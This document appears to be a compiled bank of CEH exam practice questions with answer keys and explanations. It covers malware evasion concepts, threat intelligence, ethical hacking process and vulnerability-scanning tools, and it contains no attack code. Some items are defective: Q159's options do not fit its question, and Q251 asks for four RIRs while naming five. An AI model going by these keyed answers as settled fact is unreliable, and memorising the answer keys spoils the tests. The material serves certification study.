**Which of the following techniques is used by malware to evade detection by antivirus software?**

- A) Port scanning
- B) Code obfuscation
- C) Packet sniffing
- D) SQL injection

**Answer:** B
**Explanation:** Code obfuscation alters the malware's code structure to avoid detection by signature-based antivirus software while maintaining functionality. The other options are attack techniques, not evasion methods.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-malware-threats-1749512512505

---

## Q191
**A malware analysis lab is set up to safely execute and study malware samples. Which specific setup ensures that malware cannot communicate with external servers during analysis?**

- A) Isolated virtual environment with internet access disabled
- B) Dual-homed host configuration
- C) Bridged network setup
- D) Network Address Translation (NAT) enabled environment

**Answer:** A
**Explanation:** An isolated virtual environment with internet access disabled ensures that the malware cannot communicate with external C2 servers. Dual-homed and bridged configurations may permit external communication.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-malware-threats-1749512512505

---

## Q218
**Which type of malware disguises itself as legitimate software to trick users into downloading and installing it?**

- A) Virus
- B) Worm
- C) Trojan
- D) Spyware

**Answer:** C
**Explanation:** A Trojan is a type of malware that pretends to be legitimate software, tricking users into installing it. Once installed, it allows attackers to compromise the system through backdoor access.
**Source:** https://cehtest.com/ceh-questions.html

---

## Q259
**What is a Wrapper in Trojan creation?**

- A) A tool to encrypt the Trojan payload
- B) A tool to bind the Trojan to a legitimate file
- C) A tool to compress the Trojan for faster delivery
- D) A tool to obfuscate the Trojan's code

**Answer:** B
**Explanation:** A wrapper is a tool used to bind a Trojan to a legitimate file, combining them so the user sees and runs the legitimate file while the Trojan executes silently in the background.
**Source:** https://blog.trainace.com/ceh-practice-test

---

## Q321
**Security administrator John discovers that user data has been exfiltrated from the network. No antivirus or IDS alerts were triggered, and application whitelisting was in place. What type of malware most likely bypassed all these controls?**

- A) File-less malware
- B) Zero-day malware
- C) Phishing malware
- D) Logic bomb malware

**Answer:** A
**Explanation:** File-less malware resides entirely in memory without creating any files on disk, allowing it to bypass signature-based antivirus detection, IDS signatures, and application whitelisting. It typically uses legitimate system tools (PowerShell, WMI) to execute malicious actions - a technique known as 'living off the land' (LOtL).
**Source:** https://awslagi.com/course/312-50v12/lessons/certified-ethical-hacker-v12-topic-2/

---

## Q322
**Employees at an organization receive emails with suspicious attachments that install malware when opened. What measure would most effectively prevent these targeted attacks?**

- A) Disable Autorun functionality
- B) Avoid outdated browsers and email software
- C) Regularly scan for new files
- D) Apply latest patches and updates

**Answer:** D
**Explanation:** Timely patch application closes known vulnerabilities that are exploited by malware delivery mechanisms and attachment-based attacks. While all options have some value, keeping systems patched addresses the most common exploit vectors used in email-based malware campaigns and ransomware delivery.
**Source:** https://awslagi.com/course/312-50v12/lessons/certified-ethical-hacker-v12-topic-2/

---

## Q323
**Arnold collects contextual information about security events from human sources, social media, and chat rooms to disclose risks and attacker methodologies. What type of threat intelligence is this?**

- A) Strategic threat intelligence
- B) Operational threat intelligence
- C) Technical threat intelligence
- D) Tactical threat intelligence

**Answer:** B
**Explanation:** Operational threat intelligence provides immediate context about active threats, attacker methodologies, and campaign details for defense planning. It comes from human sources (HUMINT), social media, chat rooms, and dark web forums. Strategic TI is high-level for executives, technical TI is machine-readable IOCs, and tactical TI covers TTPs.
**Source:** https://awslagi.com/course/312-50v12/lessons/certified-ethical-hacker-v12-topic-2/

---

## Q324
**Roma feeds threat intelligence data into security devices in digital format to automatically identify and block inbound/outbound malicious traffic. What type of threat intelligence is this?**

- A) Operational threat intelligence
- B) Strategic threat intelligence
- C) Tactical threat intelligence
- D) Technical threat intelligence

**Answer:** D
**Explanation:** Technical threat intelligence provides actionable, machine-readable data such as IP addresses, domain names, file hashes, and signatures that can be fed directly into security devices (SIEM, IDS/IPS, firewalls) for automated blocking and detection of malicious traffic associated with known threats.
**Source:** https://awslagi.com/course/312-50v12/lessons/certified-ethical-hacker-v12-topic-2/

---

## Q338
**A cybercriminal group operates a platform where affiliates can access ransomware tools, infrastructure, and negotiation support in exchange for a percentage of ransom payments. What is this business model called?**

- A) Malware-as-a-Service (MaaS)
- B) Ransomware-as-a-Service (RaaS)
- C) Crimeware-as-a-Service (CaaS)
- D) Exploit-as-a-Service (EaaS)

**Answer:** B
**Explanation:** Ransomware-as-a-Service (RaaS) is a subscription or affiliate-based model where ransomware developers provide tools, infrastructure, and support to affiliates who conduct attacks. Groups like RansomHub (531 victims in 2024) and LockBit operate using this model. CEH v13 specifically covers RaaS as a key malware threat trend, with the Malware Threats module representing 10-14% of the exam.
**Source:** https://www.ethicalhackinginstitute.com/blog/how-to-learn-malware-analysis-for-ceh-exam

---

## Q339
**A professional hacker performs a network attack, gains unauthorized access, and remains in the network undetected for an extended period while systematically collecting sensitive information. Which type of attack best describes this scenario?**

- A) Distributed Denial-of-Service (DDoS) attack
- B) Advanced Persistent Threat (APT)
- C) SQL Injection attack
- D) Social engineering attack

**Answer:** B
**Explanation:** An Advanced Persistent Threat (APT) is characterized by sophisticated, long-term, targeted attacks where the adversary gains access and maintains persistence in a network to exfiltrate data over time. Key characteristics include: advanced techniques, persistent access maintenance, and targeted objectives. APT lifecycle phases include initial intrusion, establishing persistence, command and control, lateral movement, and data exfiltration.
**Source:** https://awslagi.com/course/312-50v12/lessons/certified-ethical-hacker-v12-topic-2/

---

## Q340
**Which action represents the 'delivery' step in the Cyber Kill Chain model?**

- A) Intruder creates a malware payload as an email attachment
- B) Malware triggers when the target opens the attachment
- C) Malware installs a backdoor on the target machine
- D) Intruder sends the malicious attachment via email to the target

**Answer:** D
**Explanation:** In Lockheed Martin's Cyber Kill Chain, the Delivery phase involves transmitting the weaponized payload to the target through a selected vector (email, USB, web). Creating the payload is 'Weaponization,' triggering is 'Exploitation,' and installing a backdoor is 'Installation.' Understanding the kill chain is critical for disrupting APT campaigns at different phases.
**Source:** https://awslagi.com/course/312-50v12/lessons/certified-ethical-hacker-v12-topic-2/

---

# Information Security & Ethical Hacking Overview (17 questions)

## Q44
**Unauthorized firewall rule found without manager approval. What should be done?**

- A) Document why it was done without approval
- B) Monitor traffic until approved
- C) Keep the rule but get approval ASAP
- D) Immediately roll back the rule

**Answer:** D
**Explanation:** Unauthorized changes should be immediately rolled back per change management procedures.
**Source:** Pass4Success

---

## Q46
**Risk decreased from 50% to 10% after controls. Threshold is 20%. Best decision?**

- A) Accept the risk
- B) Add controls to reach 0%
- C) Mitigate the risk
- D) Avoid the risk

**Answer:** A
**Explanation:** Since risk (10%) is below threshold (20%), accepting residual risk is most cost-effective.
**Source:** Pass4Success

---

## Q96
**What is the FIRST step in a penetration test?**

- A) Vulnerability scanning
- B) Exploitation
- C) Passive information gathering
- D) Report writing

**Answer:** C
**Explanation:** Passive information gathering is always the first step.
**Source:** Pearson IT Certification

---

## Q109
**Primary difference between vulnerability scan and penetration test?**

- A) Vuln scans automated, pen tests manual
- B) Vuln scans identify weaknesses, pen tests exploit them
- C) Pen tests only check known vulns
- D) No difference

**Answer:** B
**Explanation:** Vulnerability scanning identifies; penetration testing actively exploits to assess impact.
**Source:** CEH Study Guide

---

## Q113
**What does CVE stand for?**

- A) Common Vulnerability Exploits
- B) Common Vulnerabilities and Exposures
- C) Certified Vulnerability Enumeration
- D) Critical Vulnerability Events

**Answer:** B
**Explanation:** CVE is a standardized list of publicly known cybersecurity vulnerabilities.
**Source:** CEH Study Guide

---

## Q116
**Which Cyber Kill Chain phase delivers the weaponized payload?**

- A) Reconnaissance
- B) Weaponization
- C) Delivery
- D) Exploitation

**Answer:** C
**Explanation:** Delivery transmits the payload to target via email, USB, web, etc.
**Source:** CEH Study Guide

---

## Q125
**Which regulation requires breach notification within 72 hours for EU citizens' data?**

- A) HIPAA
- B) GDPR
- C) PCI-DSS
- D) SOX

**Answer:** B
**Explanation:** GDPR requires breach notification within 72 hours of discovery.
**Source:** CEH Study Guide

---

## Q126
**Which of these devices would not be considered part of the Internet of Things?**

- A) Smartphone
- B) Thermostat
- C) Light bulb
- D) Set-top cable box

**Answer:** A
**Explanation:** A smartphone is a general-purpose computing device, not typically categorized as an IoT device. IoT devices are typically single-purpose, embedded devices like thermostats, light bulbs, and set-top boxes.
**Source:** https://www.edusum.com/ec-council/ec-council-ceh-312-50-certification-sample-questions

---

## Q133
**How would you ensure that confidentiality is implemented in an organization?**

- A) Watchdog processes
- B) Encryption
- C) Cryptographic hashes
- D) Web servers

**Answer:** B
**Explanation:** Encryption ensures confidentiality by converting data into an unreadable format that can only be accessed by authorized parties with the decryption key. Hashes ensure integrity, not confidentiality.
**Source:** https://www.edusum.com/ec-council/ec-council-ceh-312-50-certification-sample-questions

---

## Q159
**Which of the following best describes the purpose of a firewall?**

- A) Encryption
- B) Firewall
- C) DMZ
- D) VLAN

**Answer:** B
**Explanation:** A firewall is a network security device that monitors and controls incoming and outgoing network traffic based on predetermined security rules, preventing unauthorized access to or from a private network.
**Source:** https://www.vinsys.com/blog/top-30-mcqs-ceh-exam-preparation

---

## Q179
**You have been given permission to perform a penetration test against a company's web server. During the test, you discover a vulnerable version of a web application. What is the ethical next step?**

- A) Exploit the vulnerability to show risk
- B) Report the finding to the client
- C) Ignore the vulnerability as you have done enough
- D) Use the vulnerability to gain unauthorized access to the database

**Answer:** B
**Explanation:** As an ethical hacker, it is essential to report all findings to the client, including vulnerabilities, to allow them to remediate. Exploiting without explicit consent for that specific action is unethical.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-introduction-to-ethical-hacking-1749440561883

---

## Q180
**You are performing a social engineering test to evaluate the awareness and responsiveness of employees to phishing attempts. What ethical concern must you address first?**

- A) The legality of sending phishing emails to employees
- B) The technical feasibility of phishing the company's employees
- C) The potential to damage the company's network through phishing
- D) The risk of accessing confidential data through phishing

**Answer:** A
**Explanation:** Before conducting a social engineering test, it is critical to address the legality, which involves ensuring you have explicit written permission and a clear understanding of the scope of testing.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-introduction-to-ethical-hacking-1749440561883

---

## Q181
**During a vulnerability assessment, you are tasked with identifying potential security issues in a client's network infrastructure. Which tool would be most effective for scanning network ports to find open services?**

- A) Aircrack-ng
- B) Nmap
- C) John the Ripper
- D) Nessus

**Answer:** B
**Explanation:** Nmap is a widely-used network scanning tool that is effective for identifying open ports and the services running on them. Aircrack-ng is for wireless, John the Ripper for passwords, Nessus for vulnerability scanning.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-introduction-to-ethical-hacking-1749440561883

---

## Q251
**What are the four existing Regional Internet Registries (RIRs)?**

- A) RIPE NCC, LACNIC, ARIN, APNIC
- B) RIPE, LACNIC, ARIN, AFRINIC
- C) IANA, RIPE, ARIN, APNIC
- D) ICANN, RIPE, ARIN, APNIC

**Answer:** A
**Explanation:** The four main RIRs are RIPE NCC (Europe/Middle East), LACNIC (Latin America/Caribbean), ARIN (North America), and APNIC (Asia-Pacific). AfriNIC is the fifth RIR for Africa.
**Source:** https://blog.trainace.com/ceh-practice-test

---

## Q252
**True or False: After Footprinting in the CEH methodology, Enumeration is the next step.**

- A) True
- B) False

**Answer:** B
**Explanation:** After Footprinting, Scanning is the next step in the CEH methodology, not Enumeration. The correct order is: Footprinting > Scanning > Enumeration > System Hacking.
**Source:** https://blog.trainace.com/ceh-practice-test

---

## Q262
**An ethical hacker needs written permission before evaluating a system's security. What is this requirement?**

- A) Training
- B) Permission
- C) Planning
- D) All of the above

**Answer:** B
**Explanation:** Written permission (often called a 'get out of jail free card' or Rules of Engagement) is the fundamental requirement that distinguishes ethical hacking from criminal hacking.
**Source:** https://techjobs.sulekha.com/techpulse/certified-ethical-hacker-ceh-exam-questions-and-answers-sample-for-practice_20628

---

## Q263
**In a white box test, the tester has what level of knowledge?**

- A) Some knowledge
- B) Complete knowledge
- C) No knowledge
- D) Permission only

**Answer:** B
**Explanation:** In a white box test, the tester has complete knowledge of the target system including source code, network diagrams, and architecture. Black box = no knowledge, Grey box = partial knowledge.
**Source:** https://techjobs.sulekha.com/techpulse/certified-ethical-hacker-ceh-exam-questions-and-answers-sample-for-practice_20628

---

# Vulnerability Analysis (9 questions)

## Q145
**Which of the following is an example of a black box testing technique?**

- A) Fuzz testing
- B) Penetration testing
- C) Vulnerability scanning
- D) Source code review

**Answer:** A
**Explanation:** Black box testing techniques involve testing software without knowledge of its internal workings. Fuzz testing sends random, invalid, or unexpected data to inputs without knowing internal code.
**Source:** https://www.vinsys.com/blog/top-30-mcqs-ceh-exam-preparation

---

## Q147
**Which of the following tools is commonly used for vulnerability assessment?**

- A) Metasploit
- B) Nikto
- C) Nessus
- D) Wireshark

**Answer:** C
**Explanation:** Nessus is a popular vulnerability scanner that can identify vulnerabilities, misconfigurations, and other security issues in networks and systems. Metasploit is for exploitation, Nikto for web servers, Wireshark for packet analysis.
**Source:** https://www.vinsys.com/blog/top-30-mcqs-ceh-exam-preparation

---

## Q151
**Which of the following is NOT a step in vulnerability assessment?**

- A) Scanning
- B) Enumeration
- C) Fuzzing
- D) Exploitation

**Answer:** D
**Explanation:** Exploitation is part of penetration testing, not vulnerability assessment. Vulnerability assessment involves scanning, enumeration, and fuzzing to identify weaknesses without actively exploiting them.
**Source:** https://www.vinsys.com/blog/top-30-mcqs-ceh-exam-preparation

---

## Q163
**An ethical hacker is using a tool to perform a vulnerability scan on a network. Which of the following is a common output of such a scan?**

- A) List of open ports
- B) List of user passwords
- C) List of detected vulnerabilities
- D) List of encrypted files

**Answer:** C
**Explanation:** Vulnerability scans output a list of detected vulnerabilities with severity ratings. Port scans list open ports. Vulnerability scans do not reveal passwords or encrypted files.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-scanning-networks-1749512463846

---

## Q169
**An ethical hacker is tasked with identifying and exploiting vulnerabilities in a wireless network. Which tool would be most suitable for this task?**

- A) Aircrack-ng
- B) Nmap
- C) sqlmap
- D) Metasploit

**Answer:** A
**Explanation:** Aircrack-ng is a suite of tools specifically designed for assessing wireless network security, including monitoring, attacking, testing, and cracking Wi-Fi passwords.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-vulnerability-analysis-1749512487213

---

## Q170
**After discovering a critical vulnerability in a network service during an assessment, which step should be taken first to confirm its validity before reporting it to the client?**

- A) Immediately exploit the vulnerability for proof of concept
- B) Perform a deeper scan with a different tool to cross-verify
- C) Inform the client without further verification
- D) Check the service's patch documentation for confirmation

**Answer:** B
**Explanation:** Performing a deeper scan with a different tool helps confirm the presence of the vulnerability without prematurely exploiting it, reducing false positives and ensuring accuracy.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-vulnerability-analysis-1749512487213

---

## Q171
**After running a network scan, you find multiple open ports on a server. Which port should be a priority for further investigation due to its historical association with security vulnerabilities?**

- A) 21 (FTP)
- B) 80 (HTTP)
- C) 443 (HTTPS)
- D) 22 (SSH)

**Answer:** A
**Explanation:** Port 21 is used for FTP, which historically has had many security issues including clear-text transmission of credentials, anonymous access, and numerous protocol vulnerabilities.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-vulnerability-analysis-1749512487213

---

## Q172
**An ethical hacker is tasked with identifying outdated software versions on a target system that might have vulnerabilities. Which tool is best suited for this purpose?**

- A) Wireshark
- B) Nessus
- C) Cain & Abel
- D) Aircrack-ng

**Answer:** B
**Explanation:** Nessus is a vulnerability scanner that can identify outdated software, missing patches, and potential vulnerabilities across systems and applications.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-vulnerability-analysis-1749512487213

---

## Q173
**To conduct a thorough vulnerability analysis, an ethical hacker needs to identify misconfigured services on a Linux server. Which tool would be most effective?**

- A) Nikto
- B) Lynis
- C) sqlmap
- D) Metasploit

**Answer:** B
**Explanation:** Lynis is a security auditing tool for Unix-based systems, useful for identifying misconfigurations, security hardening opportunities, and compliance issues on Linux servers.
**Source:** https://flashgenius.net/blog-article/ceh-certified-ethical-hacker-practice-questions-vulnerability-analysis-1749512487213

---
